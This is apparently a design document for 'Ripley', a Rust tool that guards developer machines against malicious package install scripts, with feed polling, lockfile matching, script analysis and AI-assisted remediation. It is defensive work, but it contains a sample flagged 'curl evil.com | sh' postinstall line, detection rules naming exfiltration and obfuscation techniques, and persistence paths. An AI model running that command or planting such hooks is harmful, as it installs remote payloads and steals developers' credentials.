# Architecture

This document covers the detailed design, component specifications, technical decisions,
and roadmap for Ripley. For the project overview, motivation, and high-level architecture,
see [README.md](README.md).


## Design by Phase

Ripley's design follows the three-phase model described in the README: before, during, and
after the breach. Each phase has distinct components, data flows, and user interactions.

### Before the breach: forward defense

**Threat awareness before exposure.** Polling structured vulnerability feeds (OSV.dev,
GitHub Advisory Database, Socket.dev) on a continuous loop and cross-referencing against
every lockfile on your machine. You learn that a package you depend on was compromised
*before* your next `npm install`, not after it.

**Interception before execution.** Package manager install scripts (`preinstall`,
`postinstall`, `prepare` in npm; `setup.py` in pip; build scripts in cargo) are the primary
entry point for supply chain malware. Ripley intercepts these scripts and analyzes them
before they run. If a `postinstall` script downloads a binary, decodes base64, shells out
to curl, or exhibits obfuscation patterns, it is flagged and blocked --- not logged after
the fact.

This is where the biggest gap exists today. Almost no tooling operates between "a malicious
package is published" and "a developer installs it." Forward defense closes that gap.

### During the breach: active detection

Not every attack can be prevented. A compromised package might have been installed before
any advisory existed. A developer might have approved a script that looked benign. The
threat is already inside the perimeter.

**Process and network monitoring.** Watching for IOC patterns in real time: unexpected
outbound connections from Node/Python processes, writes to known persistence paths
(`.claude/settings.json`, `.vscode/tasks.json`, shell RC files, LaunchAgents), privilege
escalation attempts, or processes masquerading as system services.

**Filesystem anomaly detection.** Watching project directories for changes that match
known attack signatures: new files appearing in `.claude/` or `.vscode/` that weren't
committed, modifications to lockfiles outside of an explicit install, unexpected binaries in
`node_modules/.cache/` or Python site-packages.

**Real-time alerting.** When active compromise indicators are detected, Ripley fires an
immediate high-priority notification with a "Contain" action that can kill the suspicious
process, revoke the network access, and snapshot the current state for analysis.

### After the breach: automated response

The breach happened. Maybe it was caught in minutes, maybe it was discovered days later from
a security blog. Either way, the machine needs to be assessed, cleaned, and hardened.

**Forensic scan.** `ripley scan --deep` performs the kind of audit a security engineer would
do manually: checking installed package versions against known-compromised lists, searching
for IOC files (persistence markers, exfiltration staging, dropped binaries), auditing shell
RC files for injected commands, reviewing Launch Agents / cron / systemd for unauthorized
persistence, checking for unauthorized SSH keys, and scanning active network connections
against known C2 infrastructure.

**Credential exposure assessment.** Based on the specific attack's known behavior, Ripley
identifies which credential stores were likely accessed: AWS keys, GitHub tokens, npm
tokens, SSH keys, `.env` files, Kubernetes configs. It generates a specific rotation
checklist rather than a generic "rotate everything."

**AI-driven remediation.** Ripley generates a scoped remediation prompt and hands it to
whichever AI coding harness the developer uses (Claude Code, Codex, OpenCode). The prompt
includes the specific CVE, the affected package and version, the project path, known IOC
file paths to check, and the clean version to upgrade to. The harness executes the fix. The
developer reviews and approves.

This shifts the response timeline from "read a blog post, understand the threat, manually
audit your projects, figure out what to do" (hours to days) to "notification, one click,
review diff" (minutes).

**Post-incident hardening.** After remediation, Ripley suggests forward-defense measures
specific to the attack that just hit: adding the compromised package's scope to the guard's
watch list, tightening script analysis thresholds, enabling filesystem monitoring on the
paths that were targeted, blocking the C2 domains at the network level.


## Components

### Component 1: `ripley` --- the tray app

Built with [Tauri v2](https://v2.tauri.app) (Rust backend, native webview). Produces a
~5MB binary, 30-40MB idle RAM on each platform versus ~200MB+ for Electron. Tray-only
mode: Tauri v2 supports `"windows": []` in config, running as a pure system tray app with
no visible window at launch. The webview only loads when the user opens a detail panel.

```
┌──────────────────────────────────────────────────┐
│                 ripley (tray app)                 │
│                                                  │
│  ┌────────────┐     ┌─────────────┐              │
│  │ Feed Poller│     │  Lockfile   │              │
│  │            │     │  Indexer    │              │
│  │ OSV.dev    │     │            │              │
│  │ GHSA       │     │ walks project              │
│  │ Socket.dev │     │ roots, watches│             │
│  │            │     │ for changes │              │
│  └─────┬──────┘     └──────┬──────┘              │
│        │                   │                     │
│        └───────┬───────────┘                     │
│                ▼                                 │
│        ┌───────────────┐                         │
│        │    Matcher    │                         │
│        │              │                         │
│        │ new advisory │                         │
│        │ × installed  │                         │
│        │ = alert?     │                         │
│        └───────┬──────┘                         │
│                │ yes                             │
│                ▼                                 │
│        ┌──────────────────────────────┐          │
│        │  Native OS Notification     │          │
│        │  [View] [Fix] [Dismiss]     │          │
│        └───────────┬─────────────────┘          │
│                    │ "Fix"                      │
│                    ▼                             │
│        ┌──────────────────────────────┐          │
│        │     Prompt Generator        │          │
│        │                             │          │
│        │  ┌────────────────────────┐ │          │
│        │  │ CVE + versions        │ │          │
│        │  │ project path          │ │          │
│        │  │ IOC file paths        │ │          │
│        │  │ cred rotation list    │ │          │
│        │  │ clean version         │ │          │
│        │  │ test command          │ │          │
│        │  └────────────────────────┘ │          │
│        └───────────┬─────────────────┘          │
│                    │                             │
│                    ▼                             │
│        ┌──────────────────────────────┐          │
│        │     Harness Launcher        │          │
│        │  claude | codex | opencode  │          │
│        └──────────────────────────────┘          │
└──────────────────────────────────────────────────┘
```

**Feed poller.** Hits three structured APIs on a configurable interval (default: 5 minutes):
- [OSV.dev](https://osv.dev) --- Google's aggregated vulnerability database. Covers npm,
  PyPI, crates.io, Go, RubyGems, Packagist, NuGet, Maven. Structured JSON with affected
  version ranges.
- [GitHub Advisory Database](https://github.com/advisories) --- GHSA advisories via the
  GraphQL API. Feeds `npm audit` and `pip audit` under the hood.
- [Socket.dev](https://socket.dev) --- Detected the TanStack compromise in 6 minutes.
  Offers an API for real-time malicious package alerts.

Each feed item is normalized to: `(ecosystem, package, affected_versions, severity, cve,
description, iocs)`.

**Lockfile indexer.** On startup, walks configured project roots and indexes every lockfile
it finds. Watches for filesystem changes via FSEvents (macOS), inotify (Linux), or
ReadDirectoryChangesW (Windows) using the `notify` Rust crate. Maintains an in-memory map
of `(ecosystem, package, installed_version)` tuples across all projects.

**Matcher.** When a new feed item arrives, queries the lockfile index. If any installed
version falls within the affected range, the item is promoted to an alert.

**Notifier.** Fires a native OS notification. On macOS: UNUserNotificationCenter. On
Windows: toast via the Windows notification API. On Linux: D-Bus
`org.freedesktop.Notifications`. Tauri abstracts this. Actions vary by phase:
- **Before** (advisory match): **View** (detail panel with advisory, affected projects, IOC
  checklist), **Fix** (generate remediation prompt and launch harness), **Dismiss**.
- **During** (active compromise detected): **View**, **Contain** (kill suspicious process,
  snapshot state), **Investigate** (open forensic detail).
- **After** (post-incident scan results): **View**, **Remediate** (generate and launch fix
  prompt), **Rotation Checklist** (show which credentials to rotate).

**Prompt generator.** Builds a self-contained remediation prompt from advisory or scan data.
Used in both the "before" flow (advisory match → Fix) and the "after" flow (`ripley fix` /
`ripley scan --deep` → Remediate). The prompt is scoped to the specific attack:

```
In the project at /Users/jack/src/myapp, the package @tanstack/react-router
is installed at version 1.169.5, which is compromised (CVE-2026-45321).

1. Update to the latest clean version.
2. Check for these IOC files and remove them if present:
   - .claude/execution.js
   - .claude/setup.mjs
   - .vscode/setup.mjs
   - node_modules/@tanstack/*/router_init.js
3. Run the test suite and verify the build passes.
4. Report what you found and what you changed.
```

**Harness launcher.** Detects available AI coding CLIs in PATH order: `claude`, `codex`,
`opencode`. User can set a preference. Spawns the harness in a new terminal window with the
generated prompt. The developer stays in control --- they review the diff before committing.

### Component 2: `ripley-guard` --- the package manager interceptor

A standalone Rust binary, separate from the tray app. Runs without a GUI. Can be used in CI.

```
┌──────────────────────────────────────────────────┐
│           ripley-guard (CLI shim)                │
│                                                  │
│  npm install ──►┌──────────────────┐             │
│  pip install ──►│ Script Extractor │             │
│  cargo build ──►│                  │             │
│  gem install ──►│ fetch tarball,   │             │
│  go install  ──►│ parse lifecycle  │             │
│                 │ hooks            │             │
│                 └────────┬─────────┘             │
│                          │                       │
│                          ▼                       │
│                 ┌──────────────────┐              │
│                 │ Static Analyzer │              │
│                 │                 │              │
│                 │ network calls?    ──► ■        │
│                 │ eval / exec?      ──► ■        │
│                 │ base64 decode?    ──► ■        │
│                 │ binary download?  ──► ■        │
│                 │ obfuscation?      ──► ■        │
│                 │ known patterns?   ──► ■        │
│                 │                 │              │
│                 │ risk: low | med | high         │
│                 └────────┬─────────┘             │
│                          │                       │
│                     low  │  med/high             │
│                     ┌────┴────┐                  │
│                     ▼         ▼                  │
│                auto-allow   prompt user          │
│                             with details         │
└──────────────────────────────────────────────────┘
```

**Installation.**

```
ripley guard install
```

This does two things:

1. **PATH shims.** Prepends `~/.ripley/bin/` to PATH (via shell RC file) and places
   compiled Rust shim binaries for each supported package manager (modeled after
   [Volta](https://volta.sh)'s approach). Each shim resolves the real binary via
   `which -a`, performs advisory + script analysis, then delegates. The shims are native
   binaries, not shell scripts --- startup overhead is < 10ms.

2. **npm `script-shell`.** Sets `script-shell=~/.ripley/bin/ripley-script-shell` in the
   user's `.npmrc`. This tells npm to execute *every* lifecycle script (`preinstall`,
   `postinstall`, `prepare`, etc.) through Ripley's analyzer instead of `/bin/sh`. The
   analyzer receives the script content, runs static analysis, and either executes it
   (low risk) or prompts the user (medium/high risk). This is the deepest interception
   point available: it catches scripts from transitive dependencies that the PATH shim
   alone would miss.

Per-package-manager strategy:

| PM | Shim | Extra hook | Notes |
|----|------|-----------|-------|
| npm | `~/.ripley/bin/npm` | `script-shell` in `.npmrc` | Shim checks advisories pre-install; script-shell analyzes each lifecycle script at execution time |
| yarn | `~/.ripley/bin/yarn` | --- | Shim only; Yarn PnP has different lifecycle semantics |
| pnpm | `~/.ripley/bin/pnpm` | `script-shell` in `.npmrc` | Same `.npmrc` trick works for pnpm |
| pip | `~/.ripley/bin/pip` | --- | Shim intercepts; analyzes `setup.py` / build backend scripts |
| cargo | `~/.ripley/bin/cargo` | --- | Shim intercepts `cargo build`/`install`; analyzes `build.rs` and proc macros |
| gem | `~/.ripley/bin/gem` | `pre_install` hook | Shim + Rubygems hook API for lifecycle interception |
| go | `~/.ripley/bin/go` | --- | Advisory check only; Go has no install scripts |

**Script extraction.** Before running any install, the guard:
1. Resolves the package and version from the registry.
2. Fetches the tarball (or reads from cache).
3. Extracts lifecycle scripts from `package.json` (`preinstall`, `install`, `postinstall`,
   `prepare`, `prepack`), `setup.py`, `pyproject.toml` build backends, etc.
4. If the script references other files, extracts those too.

**Static analysis.** Each script is analyzed against a rule engine:

| Signal | Weight | Example |
|--------|--------|---------|
| Network call | High | `curl`, `wget`, `fetch()`, `http.get`, `net.connect` |
| Code generation | High | `eval()`, `Function()`, `new Function`, `vm.runInContext` |
| Encoding/obfuscation | High | `base64`, `Buffer.from`, `atob`, `String.fromCharCode` |
| Binary execution | Critical | Downloading and executing `.exe`, `.sh`, ELF binaries |
| Shell spawning | High | `child_process.exec`, `subprocess.run`, `os.system` |
| Environment harvesting | Medium | Bulk `process.env` access, reading `.env` files |
| File system scope escape | Medium | Writing outside the package directory |
| Known malicious patterns | Critical | Bun runtime smuggling, `.claude/settings.json` injection |
| Obfuscation tools | Critical | javascript-obfuscator markers, Pyarmor headers |
| Script size anomaly | Medium | postinstall script > 100KB (legitimate ones are rarely large) |

Scripts scoring below threshold auto-approve. Scripts above threshold present the developer
with a highlighted view of the suspicious code and ask for confirmation:

```
ripley-guard: @example/pkg@1.2.3 postinstall script flagged (risk: high)

  #!/bin/sh
  curl -s https://evil.com/payload.sh | sh    ← network call + pipe to shell

  [allow] [block] [inspect] [always trust @example/pkg]
```

**Trust management.** Developers can trust specific packages, publishers, or scopes. Trusted
packages bypass analysis. The trust list is local and explicit --- Ripley never auto-trusts.

**CI mode.** In CI environments (`CI=true`), the guard runs non-interactively. High-risk
scripts fail the build. Configuration via `.ripley.toml` in the project root:

```toml
[guard]
mode = "strict"  # "strict" blocks high-risk, "audit" logs only, "off" disables
trust = ["@tanstack/*", "typescript", "esbuild"]
```


## Technical Decisions

| Decision | Choice | Rationale |
|----------|--------|-----------|
| Language | Rust | Both the tray app and guard need to be fast, dependency-free, and cross-platform. The guard runs on every `npm install` --- it must add < 200ms latency. |
| Tray framework | Tauri v2 | Native webview, ~5MB binary, 30-40MB idle RAM, ships on macOS/Windows/Linux. Avoids bundling Chromium. Uses `tray-icon` crate internally --- if Tauri proves too heavy, we can drop to pure Rust (`tray-icon` + `notify-rust` + `reqwest`) at 5-15MB idle with the same tray primitives. |
| Local storage | `redb` | Pure Rust embedded key-value store with ACID transactions. No C dependencies (unlike SQLite/rusqlite), no FFI. Stores the local advisory cache, lockfile index, trust list, and guard decision log. |
| Data source | OSV.dev primary | Free, open, structured, aggregates all ecosystems. No API key required. |
| Detection rules | Static rules, compiled in | TOML rule files under `rules/` are embedded at build time via `include_str!`. Fast, deterministic, no ML false positives. Rules are derived from real attacks (TanStack worm patterns, Shai-Hulud IOCs, elementary-data `.pth` trick). New rules ship with new releases. |
| Lockfile format | Parse directly | Don't depend on package managers to report their own state. Read `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`, etc. directly. |
| Filesystem watching | `notify` crate | Cross-platform abstraction over FSEvents/inotify/ReadDirectoryChanges. Used for lockfile re-indexing (before) and unauthorized write detection (during). |
| npm interception | Hybrid: PATH shim + `script-shell` | PATH shim intercepts `npm install` for pre-install advisory checks. Additionally, setting `script-shell=~/.ripley/bin/ripley-script-shell` in `.npmrc` routes *all* lifecycle script execution through Ripley's analyzer --- every `preinstall`, `postinstall`, and `prepare` script runs through our static analyzer as its shell. This is a unique capability: other tools either block all scripts or allow all scripts. Ripley analyzes each one individually at execution time. |
| Other PM interception | PATH shims | pip, cargo, gem, go: compiled Rust shim binaries in `~/.ripley/bin/` (modeled after Volta's approach). Each shim resolves the real binary, performs analysis, then delegates. Go has no install scripts, so its shim only checks advisories. |
| Harness integration | CLI spawning | No deep integration with any specific harness. Spawn `claude -p`, `codex -q`, or equivalent. Works with whatever the developer has installed. Harness-agnostic. |
| Trust model | Explicit, local | No remote trust authority. Developer opts in to trusting packages. Default is verify everything. |


## Project Structure

```
ripley/
├── Cargo.toml                  # virtual workspace root
├── Cargo.lock
├── crates/
│   ├── ripley-core/            # shared library: feed polling, lockfile parsing,
│   │   └── src/                #   matching, advisory DB (redb), detection rules,
│   │       ├── lib.rs          #   prompt generation
│   │       ├── feed/
│   │       ├── lockfile/
│   │       ├── matcher.rs
│   │       ├── db.rs
│   │       ├── rules/
│   │       └── prompt.rs
│   ├── ripley-guard/           # package manager interceptor (standalone binary)
│   │   └── src/
│   │       ├── main.rs
│   │       ├── shim.rs         # PATH shim logic, PM dispatch
│   │       ├── script_shell.rs # npm script-shell analyzer
│   │       ├── extractor.rs    # script extraction from tarballs
│   │       └── analyzer.rs     # static analysis rule engine
│   └── xtask/                  # build automation: rule compilation,
│       └── src/                #   shim generation, release packaging
│           └── main.rs
├── src-tauri/                  # Tauri v2 tray app
│   ├── Cargo.toml
│   ├── tauri.conf.json
│   ├── src/
│   │   ├── main.rs
│   │   ├── tray.rs             # system tray setup + menu
│   │   ├── poller.rs           # background feed polling loop
│   │   ├── watcher.rs          # filesystem monitoring (notify crate)
│   │   └── harness.rs          # AI coding CLI launcher
│   └── icons/
├── frontend/                   # tray app UI (detail panels, config)
│   ├── index.html
│   ├── src/
│   └── package.json
├── rules/                      # detection rules (TOML, compiled in at build time)
│   ├── npm_postinstall.toml
│   ├── pypi_setup.toml
│   ├── credential_exfil.toml
│   └── persistence_write.toml
├── tests/
│   ├── fixtures/               # sample lockfiles, malicious scripts, tarballs
│   └── integration/
└── .ripley.toml                # default project config (guard mode, trust list)
```

The root `Cargo.toml` is a virtual workspace --- it has no `[package]` of its own. Shared
dependencies are declared once in `[workspace.dependencies]` and inherited by each crate
via `{ workspace = true }`. This keeps versions synchronized across `ripley-core`,
`ripley-guard`, and `src-tauri`.


## Competitive Landscape

The supply chain security space has active players. Ripley does not try to replace all of
them --- it fills gaps that none of them cover.

| Tool | What it does | What it doesn't do |
|------|-------------|-------------------|
| **Socket.dev** / Socket Firewall | Registry-level deep package inspection. Detected TanStack in 6 min. SaaS + GitHub app. | No persistent local daemon. No tray alerts against your lockfiles. No remediation prompts. Requires org subscription ($$$). |
| **Phylum** / Birdcage | Rust-based sandbox for install scripts (Landlock, seccomp, macOS sandbox-exec). Policy engine. | SaaS-dependent. Sandbox is Linux-best (macOS/Windows partial). No post-breach forensics or remediation. |
| **Snyk** | Broad vuln scanning, IDE plugins, CI gates. | Advisory-dependent (same lag as `npm audit`). No install-time script interception. Enterprise pricing. |
| **Endor Labs** (AURI) | AI-powered reachability analysis, SCA. | Cloud platform for enterprises. Not a local developer tool. |
| **SafeDep PMG** | Open-source package manager guard, malware analysis API. | No desktop presence, no continuous monitoring, no remediation. |
| **Aikido Endpoint** (April 2026) | Agent-based endpoint security for dev machines. | Early stage. Enterprise SaaS. No open interception layer. |
| **Semgrep Supply Chain** | Reachability-aware SCA in CI. | CI-only. Not a local developer tool. No real-time alerting. |
| **GuardDog** (DataDog) | CLI scanner for malicious packages (PyPI, npm). | One-shot scanner, not a persistent monitor. No interception. |
| `npm audit` / `pip audit` | Check installed packages against advisories. | Advisory must exist first. Runs *after* install. Doesn't block malicious scripts. |

**Where Ripley is genuinely novel:**

1. **Persistent local daemon that polls feeds against your lockfiles.** No existing tool
   runs as a desktop tray app continuously matching advisories to what's actually installed
   on your machine. Socket and Snyk operate at the registry or CI level, not on your
   local filesystem.

2. **AI remediation prompt generation from local context.** No tool generates scoped
   remediation prompts and hands them to an AI coding harness. The entire
   "notification → Fix → prompt → harness → review diff" pipeline is new.

3. **Combined tray monitor + package manager interceptor.** Socket does deep package
   analysis but at the registry. Phylum sandboxes scripts but has no tray presence. Ripley
   does both: continuous background monitoring *and* install-time interception in one
   product.

4. **npm `script-shell` interception.** Routing lifecycle script execution through Ripley's
   analyzer as the script's shell is a technique not used by any competitor. Other tools
   either disable all scripts (`ignore-scripts=true`) or allow all of them. Ripley
   analyzes each script individually at execution time.


## Threat Model

Ripley defends against:

**Before (forward defense):**
- **Malicious lifecycle scripts** --- postinstall scripts that download and execute
  payloads, exfiltrate credentials, or establish persistence. (Mini Shai-Hulud, Axios, SAP
  packages)
- **Compromised legitimate packages** --- trusted packages where a maintainer's credentials
  are stolen and a malicious version is published. (TanStack, Bitwarden CLI, elementary-data)
- **Typosquatting** --- packages with names similar to popular ones. (BufferZoneCorp,
  fake `tanstack` brand-squat)
- **Delayed activation** --- "sleeper" packages that ship clean initially and add malicious
  code in a later update. (BufferZoneCorp Ruby gems)

**During (active detection):**
- **Active credential exfiltration** --- processes making unexpected outbound connections to
  unknown infrastructure while accessing credential stores.
- **Persistence installation** --- unauthorized writes to shell RC files, LaunchAgents, cron,
  systemd units, or AI tool configs (`.claude/settings.json` SessionStart hooks,
  `.vscode/tasks.json` runOn triggers). (Mini Shai-Hulud)
- **C2 communication** --- active connections to known command-and-control infrastructure.

**After (response and recovery):**
- **IOC detection** --- finding persistence markers, dropped binaries, staging files, and
  other artifacts left by known attacks.
- **Credential exposure** --- mapping which secrets and tokens were likely accessed based on
  the specific attack's known behavior.
- **Incomplete remediation** --- ensuring all traces of an attack are removed, not just the
  obvious ones. (e.g., the TanStack worm wrote to `.claude/`, `.vscode/`, *and*
  OS-level services)

Ripley does **not** defend against:

- **Compromised compilers or OS-level toolchains** --- Ripley trusts the Rust toolchain it's
  built with and the OS it runs on.
- **Zero-day vulnerabilities in legitimate code** --- Ripley is not a SAST tool. It detects
  malicious intent in install scripts and known compromised versions, not bugs.
- **Attacks that don't use package managers** --- direct binary downloads, manual curl-pipe-
  bash, browser drive-by. Different threat, different tool.
- **Insider threats** --- a developer intentionally installing malicious code.


See [ROADMAP.md](ROADMAP.md) for the phased execution plan.
